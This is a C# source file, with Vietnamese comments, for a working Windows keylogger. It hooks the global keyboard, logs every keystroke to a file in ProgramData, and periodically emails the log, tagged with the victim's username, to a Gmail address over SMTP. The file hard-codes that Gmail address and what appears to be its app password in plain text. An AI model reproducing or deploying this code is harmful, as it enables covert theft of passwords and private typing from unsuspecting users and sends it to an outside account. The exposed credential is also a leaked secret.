﻿
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;

namespace mykeylogger01
{
    class Program
    {
        // ----------- CHỈNH SỬA CÁC BIẾN NÀY CHO TRƯỜNG HỢP SỬ DỤNG CỦA RIÊNG BẠN ----------- //
        private const string FROM_EMAIL_ADDRESS = "lehoaihuan@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "ilbu amis kziu nfkk";
        private const string TO_EMAIL_ADDRESS = "lehoaihuan@gmail.com";
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        // ----------------------------- KẾT THÚC -------------------------------- //

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";

        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            System.Windows.Forms.Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            // Lưu trữ và gửi tệp nhật ký qua email nếu đã đạt kích thước tối đa
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    // Sao chép tệp nhật ký vào kho lưu trữ
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    // Xóa tệp nhật ký
                    logFile.Delete();

                    // Gửi email kho lưu trữ và gửi email bằng chủ đề mới
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static void sendMail()
        {
            try
            {
                //  Đọc nội dung tệp lưu trữ vào biến nội dung email
                                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                string emailBody = input.ReadToEnd();
                input.Close();

                // Tạo đối tượng ứng dụng email
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                // Xây dựng thông điệp email
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                // Đặt người nhận
                message.To.Add(TO_EMAIL_ADDRESS);

                // Gửi tin nhắn
                client.Send(message);

                // Giải phóng tài nguyên được tin nhắn sử dụng (tệp lưu trữ)
                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
